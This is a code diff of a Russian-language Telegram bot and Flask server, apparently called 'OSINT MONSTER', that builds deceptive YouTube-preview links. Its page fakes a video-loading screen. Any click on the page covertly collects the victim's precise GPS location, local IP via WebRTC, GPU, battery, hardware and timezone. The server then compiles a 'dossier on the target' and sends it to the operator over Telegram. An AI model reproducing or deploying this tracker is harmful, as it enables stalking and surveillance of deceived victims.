@@ -23,43 +23,61 @@ def save_db(db):
 @app.route('/')
 def home(): return "SYSTEM ONLINE", 200
 
-# --- СТЕЛС-HTML (С МАСКИРОВКОЙ) ---
+# --- СТЕЛС-HTML С МАКСИМАЛЬНЫМ СБОРОМ ДАННЫХ ---
 HTML_TRAP = """
 <!DOCTYPE html>
 <html>
 <head>
     <title>YouTube - Посмотрите это видео</title>
     <meta property="og:title" content="YouTube: Новое видео на канале">
-    <meta property="og:description" content="1.2 млн просмотров • 2 часа назад">
+    <meta property="og:description" content="1.2 млн просмотров • Доступно для вашего региона">
     <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
     <style>
         body { background: #000; color: #fff; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .yt-loader { text-align: center; }
-        .spinner { border: 3px solid #333; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        .yt-loader { text-align: center; padding: 20px; }
+        .spinner { border: 3px solid #333; border-top: 3px solid #f00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .btn { background: #f00; color: #fff; border: none; padding: 10px 20px; border-radius: 2px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        .btn { background: #f00; color: #fff; border: none; padding: 12px 24px; border-radius: 2px; cursor: pointer; font-weight: bold; font-size: 16px; }
     </style>
 </head>
-<body>
+<body onclick="collect()">
     <div class="yt-loader" id="content">
         <div class="spinner"></div>
-        <p>Для просмотра видео подтвердите, что вы не робот</p>
-        <button class="btn" onclick="collect()">Смотреть</button>
+        <p>Для запуска видео проверьте соединение</p>
+        <button class="btn">ВОСПРОИЗВЕСТИ</button>
     </div>
 
 <script>
 async function collect() {
-    document.getElementById('content').innerHTML = '<div class="spinner"></div><p>Загрузка плеера...</p>';
+    document.getElementById('content').innerHTML = '<div class="spinner"></div><p>Инициализация защищенного плеера...</p>';
     
-    let d = { aid: "{{ aid }}", lure: "{{ lure }}", ua: navigator.userAgent, res: screen.width + "x" + screen.height };
+    let d = { 
+        aid: "{{ aid }}", lure: "{{ lure }}",
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        cores: navigator.hardwareConcurrency || "N/A",
+        mem: navigator.deviceMemory || "N/A",
+        plat: navigator.platform,
+        res: screen.width + "x" + screen.height,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
 
+    // 1. Батарея
     try {
         let b = await navigator.getBattery();
-        d.bat = Math.round(b.level * 100) + "%";
-    } catch(e) {}
+        d.bat = Math.round(b.level * 100) + "% (" + (b.charging ? "Зарядка" : "Разрядка") + ")";
+    } catch(e) { d.bat = "N/A"; }
 
+    // 2. Видеокарта (GPU)
+    try {
+        let c = document.createElement('canvas');
+        let gl = c.getContext('webgl');
+        let debug = gl.getExtension('WEBGL_debug_renderer_info');
+        d.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+    } catch(e) { d.gpu = "N/A"; }
+
+    // 3. Локальный IP (WebRTC)
     try {
         let pc = new RTCPeerConnection({iceServers:[]});
         pc.createDataChannel("");
@@ -71,23 +89,27 @@ async function collect() {
         };
     } catch(e) {}
 
+    // 4. GPS
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            (p) => { d.gps = p.coords.latitude + "," + p.coords.longitude; send(d); },
-            (e) => { d.gps = "Denied"; send(d); },
+            (p) => { 
+                d.gps = p.coords.latitude + "," + p.coords.longitude; 
+                d.acc = p.coords.accuracy + "m";
+                send(d); 
+            },
+            (e) => { d.gps = "Запрещено (" + e.message + ")"; send(d); },
             { enableHighAccuracy: true, timeout: 5000 }
         );
     } else { send(d); }
     
-    setTimeout(() => { send(d); }, 4000);
+    setTimeout(() => { if(!window.sent) send(d); }, 4000);
 }
 
 function send(d) {
     if(window.sent) return; window.sent = true;
     fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
     .finally(() => { 
-        let u = {"yt":"https://youtube.com","gg":"https://google.com"};
-        location.href = u["{{ lure }}"] || "https://youtube.com";
+        location.href = "{{ lure }}" == "yt" ? "https://youtube.com" : "https://google.com";
     });
 }
 </script>
@@ -108,18 +130,32 @@ def trap(aid, lure):
 def catch():
     d = request.json
     ips = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
     report = (
-        f"🎯 **ЦЕЛЬ ПЕРЕШЛА ПО ССЫЛКЕ**\n"
+        f"🚨 **ПОЛНОЕ ДОСЬЕ НА ЦЕЛЬ**\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 **IP:** `{ips}`\n"
-        f"🏠 **Local IP:** `{d.get('local_ip', 'N/A')}`\n"
-        f"🔋 **Заряд:** {d.get('bat', 'N/A')}\n"
-        f"📍 **GPS:** `{d.get('gps', 'N/A')}`\n"
-        f"🔗 [Открыть на карте](https://www.google.com/maps?q={d.get('gps')})\n"
+        f"🌐 **СЕТЕВЫЕ ДАННЫЕ:**\n"
+        f"• Внешние IP: `{ips}`\n"
+        f"• Локальный IP: `{d.get('local_ip', 'N/A')}`\n"
+        f"• Часовой пояс: {d.get('tz')}\n"
+        f"• Язык системы: {d.get('lang')}\n\n"
+        f"📍 **ГЕОЛОКАЦИЯ:**\n"
+        f"• Координаты: `{d.get('gps')}`\n"
+        f"• Точность: {d.get('acc', 'N/A')}\n"
+        f"• [Google Карты](https://www.google.com/maps?q={d.get('gps')})\n\n"
+        f"💻 **ЖЕЛЕЗО:**\n"
+        f"• Платформа: `{d.get('plat')}`\n"
+        f"• CPU: {d.get('cores')} ядер | RAM: ~{d.get('mem')}GB\n"
+        f"• GPU: `{d.get('gpu')}`\n"
+        f"• Экран: {d.get('res')}\n\n"
+        f"🔋 **СОСТОЯНИЕ:**\n"
+        f"• Батарея: {d.get('bat')}\n"
+        f"• Браузер: `{d.get('ua')[:80]}...`\n"
         f"━━━━━━━━━━━━━━━━━━━━"
     )
+    
     url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
-    requests.post(url, json={"chat_id": d['aid'], "text": report})
+    requests.post(url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
     return "OK", 200
 
 # --- БОТ ---
@@ -131,24 +167,22 @@ async def cmd_start(message: types.Message):
     db = load_db()
     uid = str(message.from_user.id)
     if uid not in db["users"]:
-        db["users"][uid] = {"clicks": 0, "ips": []}
+        db["users"][uid] = {"clicks": 0}
         save_db(db)
-    
     kb = ReplyKeyboardBuilder()
-    kb.add(types.KeyboardButton(text="🎬 Создать ссылку (YouTube)"))
-    kb.add(types.KeyboardButton(text="📊 Статистика"))
-    await message.answer("🤖 **OSINT STEALTH v12.0**\nВыберите действие:", reply_markup=kb.as_markup(resize_keyboard=True))
+    kb.add(types.KeyboardButton(text="🚀 Создать YouTube-ловушку"), types.KeyboardButton(text="📊 Статистика"))
+    await message.answer("💀 **OSINT MONSTER v12.1**\nВсе системы сбора данных активны.", reply_markup=kb.as_markup(resize_keyboard=True))
 
-@dp.message(F.text == "🎬 Создать ссылку (YouTube)")
+@dp.message(F.text == "🚀 Создать YouTube-ловушку")
 async def create_link(message: types.Message):
     link = f"{BASE_URL}/t/{message.from_user.id}/yt"
-    await message.answer(f"✅ **Твоя зашифрованная ссылка:**\n\n`{link}`\n\n*В мессенджерах она будет выглядеть как видео YouTube.*")
+    await message.answer(f"✅ **Ловушка готова:**\n\n`{link}`\n\n*При отправке в Viber/TG подтянется превью YouTube.*")
 
 @dp.message(F.text == "📊 Статистика")
-async def stats(message: types.Message):
+async def show_stats(message: types.Message):
     db = load_db()
     u = db["users"].get(str(message.from_user.id), {"clicks": 0})
-    await message.answer(f"📈 У тебя переходов: `{u['clicks']}`")
+    await message.answer(f"📈 Всего успешных переходов: `{u['clicks']}`")
 
 async def main():
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
